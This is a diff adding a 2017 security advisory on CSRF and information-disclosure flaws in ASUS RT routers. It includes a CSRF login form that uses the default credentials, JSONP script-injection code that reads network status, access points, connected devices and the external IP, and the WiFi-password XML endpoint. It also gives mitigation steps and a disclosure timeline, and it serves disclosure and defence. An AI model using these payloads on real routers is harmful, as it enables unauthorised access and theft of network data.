@@ -1,0 +1,280 @@
+id: 27754
+date: 05/11/2017
+title: ASUS Routers CSRF / Information Disclosure Vulnerabilities
+author: Yakov Shafranovich
+cves: CVE-2017-5891, CVE-2017-5892
+
+[Original post here:
+https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/]
+
+Summary
+
+Various models of ASUS RT routers have several CSRF vulnerabilities
+allowing malicious sites to login and change settings in the router;
+multiple JSONP vulnerabilities allowing exfiltration of router data
+and an XML endpoint revealing WiFi passwords. Most of these issues
+have been fixed by Asus in the March 2017 firmware update under
+v3.0.0.4.380.7378. One issue (JSONP information disclosure) remains
+unfixed since the vendor doesn't consider it to be a security threat.
+CVE-2017-5891 has been assigned to the CSRF issues, and CVE-2017-5892
+to cover the non-CSRF issues.
+
+Vulnerability Details
+
+RT routers from ASUS like many other routers come with a built-in web
+interface accessible over the local network but normally not
+accessible via the Internet. We discovered multiple issues within that
+web interface that would can facilitate attacks on the router either
+via a malicious site visited by a user on the same network, or a
+malicious mobile or desktop application running on the same network.
+For the CSRF vulnerabilities, a user would need to visit a malicious
+site which can try to login and change settings. For the JSONP
+vulnerabilities, a website can load the JSONP endpoints via SCRIPT
+tags as long as matching function name is defined on that site. The
+XML endpoint requires a mobile or desktop application to exploit.
+NOTE: all of these assume that the attacker knows the local IP address
+of the router. This could probably be guessed or be determined via
+Javascript APIs like WebRTC. For desktop and mobile applications,
+determination of the gateway address should be trivial to implement.
+
+Issue #1 - Login Page CSRF
+
+The login page for the router doesn't have any kind of CSRF
+protection, thus allowing a malicious website to submit a login
+request to the router without the user's knowledge. Obviously, this
+only works if the site either knows the username and password of the
+router OR the user hasn't changed the default credentials ("admin /
+admin"). To exploit, submit the base-64 encoded username and password
+as "login_authorization" form post, to the "/login.cgi" URL of the
+browser.
+
+Example of a form that can exploit this issue (uses default credentials):
+
+<form action="http://192.168.1.1/login.cgi"
+   method="post" target="_blank">
+<input name="login_authorization" type="text"
+   value="YWRtaW46YWRtaW4=" />
+<input type="submit" /></form>
+
+Issue #2 - Save Settings CSRF
+
+The various pages within the interface that can save settings do not
+have CSRF protection. That means that a malicious site, once logged in
+as described above would be able to change any settings in the router
+without the user's knowledge.
+
+NOTE: We have not been to exploit this issue consistently
+
+Issue #3 - JSONP Information Disclosure Without Login
+
+Two JSONP endpoints exist within the router which allow detection of
+which ASUS router is running and some information disclosure. No login
+is required to the router. The vendor doesn't consider these endpoints
+a security threat.
+
+The endpoints are as follows:
+
+/findasus.json
+
+Returns the router model name, SSID name and the local IP address of the router
+
+iAmAlive([{model?Name: "XXX", ssid: "YYY", ipAddr: "ZZZZ"}])
+
+/httpd_check.json
+
+Returns: {"alive": 1, "isdomain": 0}
+
+Exploit code as follows:
+
+function iAmAlive(payload) {
+  window.alert("Result returned: " + JSON.stringify(payload));
+}
+function alert1() {
+  var script = document.createElement('script');
+  script.src = 'http://192.168.1.1/findasus.json'
+  document.getElementsByTagName('head')[0].appendChild(script);
+}
+function alert2() {
+  var script = document.createElement('script');
+  script.src = 'http://192.168.1.1/httpd_check.json'
+  document.getElementsByTagName('head')[0].appendChild(script);
+}
+
+Issue #4 - JSONP Information Disclosure, Login Required
+
+There exist multiple JSONP endpoints within the router interface that
+reveal various data from the router including.
+
+Below is a list of endpoints and exploit code:
+
+/status.asp - Network Information
+
+function getstatus() {
+    var script = document.createElement('script');
+    script.src = 'http://192.168.1.1/status.asp'
+    document.getElementsByTagName('head')[0].appendChild(script);
+}
+function show_wanlink_info() {
+    var obj = {};
+    obj.status = wanlink_status();
+    obj.statusstr = wanlink_statusstr();
+    obj.wanlink_type = wanlink_type();
+    obj.wanlink_ipaddr = wanlink_ipaddr();
+    obj.wanlink_xdns = wanlink_xdns();
+    window.alert(JSON.stringify(obj));
+}
+
+<br/>
+<button onClick="getstatus()">Load Status script</button>
+<button onClick="show_wanlink_info()">Show wanlink info</button>
+<br/><br/>
+
+/wds_aplist_2g.asp - Surrounding Access points, 2.4 Ghz band
+
+/wds_aplist_5g.asp - Surrounding Access points, 5 Ghz band
+
+
+function getwds_2g() {
+    var script = document.createElement('script');
+    script.src = 'http://192.168.1.1/wds_aplist_2g.asp'
+    document.getElementsByTagName('head')[0].appendChild(script);
+}
+function getwds_5g() {
+    var script = document.createElement('script');
+    script.src = 'http://192.168.1.1/wds_aplist_5g.asp'
+    document.getElementsByTagName('head')[0].appendChild(script);
+}
+
+<br/>
+<button onClick="getwds_2g()">Load 2G info</button>
+<button onClick="getwds_5g()">Load 5G info</button>
+<button onClick="window.alert(JSON.stringify(wds_aplist))">Show AP info</button>
+<br/><br/>
+
+/update_networkmapd.asp - Network map of devices on the network
+
+function getmap() {
+    var script = document.createElement('script');
+    script.src = 'http://192.168.1.1/update_networkmapd.asp'
+    document.getElementsByTagName('head')[0].appendChild(script);
+}
+
+<br/>
+<button onClick="getmap()">Load Network map</button>
+<button onClick="window.alert(JSON.stringify(fromNetworkmapd))">Show
+Map</button>
+<br/><br/>
+
+/update_clients.asp - Origin data
+
+function getorigin() {
+    originData = [];
+    var script = document.createElement('script');
+    script.src = 'http://192.168.1.1/update_clients.asp'
+    document.getElementsByTagName('head')[0].appendChild(script);
+}
+
+<br/>
+<button onClick="getorigin()">Load Origin</button>
+<button onClick="window.alert(JSON.stringify(originData))">Show Origin</button>
+
+/get_real_ip.asp - External IP address
+
+function getrealip() {
+    var script = document.createElement('script');
+    script.src = 'http://192.168.1.1/get_real_ip.asp'
+    document.getElementsByTagName('head')[0].appendChild(script);
+}
+
+<br/>
+<button onClick="getrealip()">Load IP</button>
+<button onClick="window.alert(JSON.stringify(wan0_realip_ip))">Show IP</button>
+
+/get_webdavInfo.asp - WebDAV information
+
+function getwebdav() {
+    var script = document.createElement('script');
+    script.src = 'http://192.168.1.1/get_webdavInfo.asp';
+    document.getElementsByTagName('head')[0].appendChild(script);
+}
+
+<br/>
+<button onClick="getwebdav()">Load WebDav</button>
+<button onClick="window.alert(JSON.stringify(pktInfo))">Show Info 1</button>
+<button onClick="window.alert(JSON.stringify(webdavInfo))">Show Info 1</button>
+<br/><br/>
+
+Issue #5 - XML Endpoint Reveals WiFi Passwords
+
+An XML endpoint exists in the router which reveals the WiFi password
+to the router but to fully exploit this issue, it would require a
+mobile or desktop application running on the local network since XML
+cannot be loaded cross origin in the browser. This endpoint can be
+accessed at the following URL and requires login:
+
+[router IP]/WPS_info.xml
+
+Mitigation Steps / Vendor Response
+
+Users should change the default credentials and apply the latest
+firmware released by ASUS, version v3.0.0.4.380.7378 or higher. There
+is no mitigation available for the issue #3 - JSONP information
+disclosure without login.
+
+Affected models include the following ASUS routers:
+
+RT-AC55U
+RT-AC56R
+RT-AC56S
+RT-AC56U
+RT-AC66U
+RT-AC88U
+RT-AC66R
+RT-AC66U
+RT-AC66W
+RT-AC68W
+RT-AC68P
+RT-AC68R
+RT-AC68U
+RT-AC87R
+RT-AC87U
+RT-AC51U
+RT-AC53U
+RT-AC1900P
+RT-AC3100
+RT-AC3200
+RT-AC5300
+RT-N11P
+RT-N12 (D1 version only)
+RT-N12+
+RT-N12E
+RT-N18U
+RT-N56U
+RT-N66R
+RT-N66U (B1 version only)
+RT-N66W
+
+References
+
+CVE-IDs: CVE-2017-5891 and CVE-2017-5892
+CERT/CC Tracking # VR-627
+
+Credits
+
+We would like to thank CERT/CC for helping to coordinate the
+disclosure process. This advisory was written by Yakov Shafranovich.
+
+Timeline
+
+2017-01-21: Initial contact with the vendor
+2017-01-23: Initial contact with CERT/CC
+2017-02-05: Vulnerability details and POC code provided to the vendor,
+CVEs requested
+2017-02-10: Vulnerability analysis received from the vendor
+2017-02-12: Beta firmware provided by the firmware to test fixes
+2017-02-12: Vendor fixes confirmed
+2017-03-31: Fixed firmware released publicly by the vendor
+2017-05-01: Draft advisory shared with the vendor and CERT/CC
+2017-05-09: Public disclosure
+
+#  0day.today [2023-03-23]  #
